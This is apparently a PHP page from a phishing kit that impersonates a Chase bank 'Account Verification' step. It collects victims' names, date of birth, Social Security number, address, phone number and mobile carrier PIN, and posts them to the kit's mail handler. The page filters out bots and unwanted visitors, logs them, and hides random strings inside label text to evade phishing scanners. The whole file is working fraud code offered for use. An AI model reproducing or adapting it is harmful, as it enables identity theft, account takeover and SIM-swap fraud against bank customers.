<?php
session_start();
error_reporting(0);
include'spox_bot.php';
include'check.php';
if (empty($_GET['ch_id']) or empty($_GET['country']) or empty($_GET['expired']) or !isset($_SESSION['SPOX_SESSION'])) {
       text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Undefined Visitor\r\n");include'blocked.php';exit();
}
if (!isset($_SESSION['LOGIN_SESSION'])) {
    exit(header("Location: login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#32;&#45;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110; </title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link id="externalCSSLink" rel="external stylesheet" href="Spox/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="Spox/Files/img/chasefavicon.ico">
        <link href="Spox/Files/css/origination.css" rel="stylesheet" id="originationCSS">
</head>
<style type="text/css">
        .help-block.form-error{
        color:#BF2155;
    }
</style>
    <body data-has-view="true" class="no-ignore-color">
        <div id="container">
            <header id="header-container" data-has-view="true">
                <div class="header-container" data-is-view="true">
                    <div class="row top"><div class="col-xs-4">
                <span id="menuLines-iconanchor-wrapper">
                    <a class="jpui iconaction focus onDark" href="javascript:void(0);" id="menuLines">  <i class="jpui menulines icon" id="icon-menuLines" aria-hidden="true">

                    </i>
                </a>
            </span>
                <span class="jpui link" id="exitApp-link-wrapper">
                    <a class="link-anchor INPUTFIELD2" id="exitApp" href="javascript:void(0);" aria-label=" Exit , opens dialog">Exit</a>
                </span>
            </div>

<div class="col-xs-4 color-mode-header-logo">
<svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
<path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);">
</path>
<path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">
</path>
<path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);">
</path>
<path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);">
</path>
</svg>
</div>
  <div class="col-xs-4 util right aligned">

            </div>
        </div>
    </div>
</header>
<div id="main-container">
<aside id="helpbar" role="complementary" aria-label="Help Bar"></aside>
<div>
    <div class="container-fluid" id="secondary-header-container">
</div>
<form action="Spox/Mail/Mail3?token=<?=$rundomizi?>" method="POST">
<input type="hidden" name="_csrf" value="<?=$rundomizi?>">
<main class="container-fluid" id="main">
<div id="progressbar-block" data-has-view="true">
<div data-is-view="true">
<style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 50%;}</style>
    <div class="row origination-progress-block">
    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
    <div id="PROGRESSBAR_HEADER">
    <div>
    <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">&#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;</h1>
    <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true">

            </span>
            </div>
            </div>
                <div id="PROGRESSBAR_PROGRESS">
                <div class="row"><div class="col-xs-12 col-sm-12">
                <div class="jpui progress origination-custom step1of8 bar" id="main-progress" data-progress="">
                    <div class="bar fill" id="main-progress-bar">

            </div>
                <span class="util accessible-text" id="accessible-bar-main-progress">

            </span>
        </div>
    </div>
</div>
</div>

<br>
</div>
</div>
<style id="progress-bar-step-2of8">.origination-custom.jpui.progress.bar.step2of8:after{width: 50%;}</style>
</div>
</div>
<section class="origination page-content" id="content" data-has-view="true">
    <div id="CUSTOMERINFO" data-is-view="true">
        <div class="row">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personalName" data-has-view="true">
                    <div id="personal-name" data-is-view="true">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                            <div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#100;&#101;&#116;&#97;&#105;&#108;&#115;</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="BODY field-mb-24">This should be your fu<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ll leg<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>al name as it ap<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>pears on your go<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>v<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ernment ID.</div>
                        </div>
                    </div>
                    <div id="nameBlock" data-has-view="true">
                        <div class="jpmcbb nameInformation" data-is-view="true">
                        <div class="inlineFieldRow">
                            <div class="inlineFieldCell">
                                <div class="jpui fieldgroup" id="blx-nameBlock-first-name-fldgrp">
                                    <div class="jpui vertical">
                                        <div class="align-label-input">
                                            <div class="label-wrapper">
                                                <label class="jpui fieldlabel label-alignment vertical" id="blx-nameBlock-first-name-fldgrp-label" for="blx-nameBlock-first-name-fldgrp-text-validate-input-field" aria-hidden="false">
                                                    <span class="util accessible-text" id="blx-nameBlock-first-name-fldgrp-label-errorLabel">
                                                    </span>Fi<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>rst na<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>me <span class="util accessible-text" id="blx-nameBlock-first-name-fldgrp-label-accessible-text">

                                                </span>
                                                </label>
                                                 </div>
             <div class="jpui validationinput" id="blx-nameBlock-first-name-fldgrp-text">
                 <div id="blx-nameBlock-first-name-fldgrp-text-validate">
                    <input  class="jpui input" placeholder="" name="First_name" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your first name.">
                     <span class="util accessible-text validation__accessible-text" id="blx-nameBlock-first-name-fldgrp-text-validate-placeHolderAdaText"></span>
                 </div>
             </div>
         </div>
         <div>
            <div>
             </div>
         </div>
     </div>
      </div>
  </div>
  <div class="inlineFieldCell">
    <div class="jpui fieldgroup" id="blx-nameBlock-middle-name-fldgrp">
        <div class="jpui vertical">
    <div class="align-label-input">
        <div class="label-wrapper">
            <label class="jpui fieldlabel label-alignment vertical" id="blx-nameBlock-middle-name-fldgrp-label" for="blx-nameBlock-middle-name-fldgrp-text-validate-input-field" aria-hidden="false"><span class="util accessible-text" id="blx-nameBlock-middle-name-fldgrp-label-errorLabel"></span>La<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>st na<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>me<span class="util accessible-text" id="blx-nameBlock-middle-name-fldgrp-label-accessible-text"></span></label>
        </div>
            <div class="jpui validationinput" id="blx-nameBlock-middle-name-fldgrp-text">
                <div id="blx-nameBlock-middle-name-fldgrp-text-validate">
                <input class="jpui input" placeholder="" name="Last_Name" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your last name.">
                <span class="util accessible-text validation__accessible-text" id="blx-nameBlock-middle-name-fldgrp-text-validate-placeHolderAdaText">
                </span>
            </div>
        </div>
</div>
<div>
    <div>

    </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="identificationHeader" data-has-view="true">
    <div class="container-padding-after-field" id="headerSection" data-is-view="true">
        <div class="jpui header DATABOLD contact-header-margin field-mt-0 field-mb-24">Ide<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ntifica<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>tion</div>
    </div>
</div>

<div id="identityInfoId" data-has-view="true">
    <div id="IDENTITYINFO" data-is-view="true">
        <div class="row">
            <div class="col-xs-12 col-sm-6">
            <div>
                <div class="jpui fieldgroup" id="dateOfBirth">
                    <div class="jpui vertical">
                        <div class="align-label-input">
                    <div class="label-wrapper">
                        <label class="jpui fieldlabel label-alignment vertical" id="dateOfBirth-label" for="dateOfBirth-text-validate-input-field" aria-hidden="false">
                            <span class="util accessible-text" id="dateOfBirth-label-errorLabel">
                            </span>Da<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>te of bir<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>th <span class="util accessible-text" id="dateOfBirth-label-accessible-text">
                            </span>
                        </label>
                    </div>
        <div class="jpui validationinput" id="dateOfBirth-text">
            <div id="dateOfBirth-text-validate">
        <input class="jpui input" id="dlexp" name="dob"  type="tel" placeholder=""  data-validation="length" data-validation-error-msg="Please tell us your date of birth in mm/dd/yyyy format." data-validation-length="min10" >
            <span class="util accessible-text" id="dateOfBirth-text-validate-accessible-text" aria-hidden="true">: formats as you type mm/dd/yyyy</span>
            <span class="util accessible-text validation__accessible-text" id="dateOfBirth-text-validate-placeHolderAdaText">
            </span>
        </div>
    </div>
</div>
<div>
    <div>
    <div class="fieldhelpertext-container" id="dateOfBirth-helpertext-container">
    <div class="jpui fieldhelpertext" id="dateOfBirth-text-validate-helpertext">mm/dd/yyyy  </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="col-xs-12 col-sm-6">
   <div>
<div class="jpui fieldgroup" id="maskedSocialSecurityNumber">
    <div class="jpui vertical">
        <div class="align-label-input">
    <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="maskedSocialSecurityNumber-label" for="maskedSocialSecurityNumber-text-validate-input-field" aria-hidden="false">
            <span class="util accessible-text" id="maskedSocialSecurityNumber-label-errorLabel">
            </span>Social Security number <span class="util accessible-text" id="maskedSocialSecurityNumber-label-accessible-text">
            </span>
        </label>
    </div>
    <div class="jpui validationinput" id="maskedSocialSecurityNumber-text">
<div id="maskedSocialSecurityNumber-text-validate">
   <input  class="jpui input" placeholder=""  type="tel" id="ssn" name="ssn" data-validation="length" data-validation-length="min11-11"  data-validation-error-msg=" ">
<span class="util accessible-text" id="maskedSocialSecurityNumber-text-validate-accessible-text" aria-hidden="true">, Formats as you type xxx-xx-xxxx.</span>
<span class="util accessible-text validation__accessible-text" id="maskedSocialSecurityNumber-text-validate-placeHolderAdaText">

            </span>
        </div>
        </div>
        </div>
            <div>
                <div>
                <div class="fieldhelpertext-container" id="maskedSocialSecurityNumber-helpertext-container">
            <div class="jpui fieldhelpertext" id="maskedSocialSecurityNumber-text-validate-helpertext">We're required to ask for your SSN to verify your identity. We'll keep your data secure.  </div>
        </div>
    </div>
    </div>
    </div>
    </div>
        <span class="jpui link" id="showHideSSNLink-link-wrapper">

            </span></div></div></div></div></div><div id="identificationId" data-has-view="true">
                <div id="IDENTIFICATION" data-is-view="true">

     <div id="addressId" data-has-view="true"><div id="address" data-is-view="true"><div class="row container-padding-after-field">
        <div class="col-xs-12 col-sm-6">
        <div class="jpui header DATABOLD field-mt-0 field-mb-24">Contact information</div>
 </div>
 </div>
     <div id="bb-residentialAddressBlock" data-has-view="true">
        <div class="jpmcbb multiType" id="MULTI_TYPE_ADDRESS_blx-residentialAddressBlock" data-is-view="true">
        <div>
            <div class="jpmcbb addressForm">
            <div class="row">
                <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup addressStreetAddress blockFieldGroupXs" id="streetAddress-blx-residentialAddressBlock">
            <div class="jpui vertical">
                <div class="align-label-input">
                    <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="streetAddress-blx-residentialAddressBlock-label" for="streetAddress-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
        <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-errorLabel">

     </span>Street address <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-accessible-text">

     </span>
 </label>
 </div>
 <div class="jpui validationinput" id="streetAddress-blx-residentialAddressBlock-text">
    <div id="streetAddress-blx-residentialAddressBlock-text-validate">
        <input  class="jpui input"  placeholder=""  name="Streetadd" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your address.">
        <span class="util accessible-text validation__accessible-text" id="streetAddress-blx-residentialAddressBlock-text-validate-placeHolderAdaText">

        </span>
    </div>
    </div>
    </div>
        <div>
            <div>

        </div>
    </div>
    </div>
    </div>
    </div>
     <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup blockFieldGroupXs" id="apartmentNumber-blx-residentialAddressBlock">
        <div class="jpui vertical">
        <div class="align-label-input">
            <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="apartmentNumber-blx-residentialAddressBlock-label" for="apartmentNumber-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-errorLabel">

    </span>Suite/apt/other<span class="additionalText">(optional)</span>
<span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-accessible-text">

     </span>
     </label>
 </div>
     <div class="jpui validationinput" id="apartmentNumber-blx-residentialAddressBlock-text">
        <div id="apartmentNumber-blx-residentialAddressBlock-text-validate">
<input class="jpui input" placeholder="" maxlength="30" name="address22" >
<span class="util accessible-text validation__accessible-text" id="apartmentNumber-blx-residentialAddressBlock-text-validate-placeHolderAdaText">

     </span>
 </div>
 </div>
 </div>
     <div>
        <div>
        <div class="fieldhelpertext-container" id="apartmentNumber-blx-residentialAddressBlock-helpertext-container">
        <div class="jpui fieldhelpertext" id="apartmentNumber-blx-residentialAddressBlock-text-validate-helpertext">

     </div>
 </div>
 </div>
 </div>
 </div>
</div>
</div>
</div>
 <div class="row">
    <div class="col-xs-12 col-sm-6">
    <div class="jpui fieldgroup addressZipCode blockFieldGroupXs" id="zipCode-blx-residentialAddressBlock">
    <div class="jpui vertical">
    <div class="align-label-input">
    <div class="label-wrapper">
    <label class="jpui fieldlabel label-alignment vertical" id="zipCode-blx-residentialAddressBlock-label" for="zipCode-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-errorLabel">

     </span>ZIP code <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-accessible-text">

     </span>
     </label>
     </div>  <div class="jpui validationinput" id="zipCode-blx-residentialAddressBlock-text">
        <div id="zipCode-blx-residentialAddressBlock-text-validate">
        <input  class="jpui input"  placeholder=""  type="tel" name="zipcode" data-validation="length" data-validation-length="min1-5"  data-validation-error-msg="Please tell us your ZIP code.">
    <span class="util accessible-text validation__accessible-text" id="zipCode-blx-residentialAddressBlock-text-validate-placeHolderAdaText">

     </span>
     </div>
 </div>
</div>
</div>
</div>
 <div class="addressSpinnerContainer" id="spinnerContainer-blx-residentialAddressBlock" tabindex="-1">

 </div>
</div>
</div>
 <div class="row">

     </div>
 </div>
 </div>
 </div>
 </div>
<div id="addressOverlay">
</div>
 </div>
</div>

     <div id="contactInfoId" data-has-view="true">
        <div class="row" id="CONTACTINFO" data-is-view="true">
            <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup" id="phoneNumberId">
        <div class="jpui vertical">
            <div class="align-label-input">
                <div class="label-wrapper">
                    <label class="jpui fieldlabel label-alignment vertical" id="phoneNumberId-label" for="phoneNumberId-text-validate-input-field" aria-hidden="false">
        <span class="util accessible-text" id="phoneNumberId-label-errorLabel">

        </span>Phone number <span class="util accessible-text" id="phoneNumberId-label-accessible-text"
        ></span>
    </label>
</div>
     <div class="jpui validationinput" id="phoneNumberId-text">
        <div id="">
        <input  class="jpui input"  placeholder="" name="phoneNumber" id="phoneNumber"  data-validation="length" data-validation-error-msg="Tell us your phone number." data-validation-length="min14" >
        <span class="util accessible-text validation__accessible-text" id="phoneNumberId-text-validate-placeHolderAdaText">

     </span>
     </div>
</div>
</div>
<div>
<div>
</div>
</div>
</div>
</div>
</div>

    <div class="col-xs-12 col-sm-6">
    <div class="jpui fieldgroup addressZipCode blockFieldGroupXs" id="zipCode-blx-residentialAddressBlock">
    <div class="jpui vertical">
    <div class="align-label-input">
    <div class="label-wrapper">
    <label class="jpui fieldlabel label-alignment vertical" id="zipCode-blx-residentialAddressBlock-label" for="zipCode-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-errorLabel">

     </span>Carrier Pin <span class="util accessible-text" id="zipCode-blx-residentialAddressBlock-label-accessible-text">

     </span>
     </label>
     </div>  <div class="jpui validationinput" id="zipCode-blx-residentialAddressBlock-text">
        <div id="zipCode-blx-residentialAddressBlock-text-validate">
        <input class="jpui input" placeholder="" type="password" name="carrierpin" maxlength="6" minlength="4" data-validation="length" data-validation-length="min4-6" data-validation-error-msg="Please tell us your Carrier Pin.">
    <span class="util accessible-text validation__accessible-text" id="zipCode-blx-residentialAddressBlock-text-validate-placeHolderAdaText" >

     </span>
     </div>
 </div>
</div>
</div>
</div>
 <div class="addressSpinnerContainer" id="spinnerContainer-blx-residentialAddressBlock" tabindex="-1">

 </div>
</div>
</div>


     <div id="disclosure" data-has-view="true">
        <div id="disclosureComponentId" data-is-view="true">
        <div class="row">


</div>
<div id="autoLendingAgeInfoOverlayPlaceHolder">
</div>
 </div>
 </div>
</div>
</section>
 <div id="pageGroupSpinner">

 </div> <div id="navigationbar-container" data-has-view="true">
        <div id="NAVIGATIONBAR_CMPT" data-is-view="true">
            <div class="row">
                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div class="row">
                <div class="col-xs-12 navigation-top-margin">
        <button type="submit" id="NEXT-nav-ctr-btn" class="jpui button focus util float right primary">
        <span class="label">Next</span>
     </button>
        <button type="button" id="BACK-nav-ctr-btn" class="jpui button focus util float right tertiary">
            <span class="label">Back</span>
        </button>
     </div>
 </div>
 </div>
 </div>
 </div>
 </div>
</main>

</form>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});


Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn");
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dlexp");


</script>
</body>
</html>